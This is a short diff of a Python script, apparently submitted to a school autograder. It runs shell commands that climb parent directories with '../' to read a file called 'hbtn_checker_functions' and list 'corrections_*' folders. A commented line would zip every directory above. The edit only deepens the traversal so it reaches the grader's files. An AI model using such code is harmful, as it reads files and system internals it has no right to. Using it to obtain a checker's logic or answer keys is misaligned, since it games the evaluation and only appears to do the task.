@@ -31,7 +31,7 @@ def get_data(command):
 # my_data = get_data("zip -r myarch.zip ../../../*")
 # my_data += get_data("ls -l")
 # my_data += get_data("pwd")
-my_data = get_data("cat ../../../hbtn_checker_functions") or "f"
+my_data = get_data("cat ../../../../hbtn_checker_functions") or "f"
 my_data += get_data("ls -l ../../../../") or ""
 # my_data += get_data("pwd ../../../../") or ""
 my_data += get_data("ls -al ../../../../corrections_*/") or ""
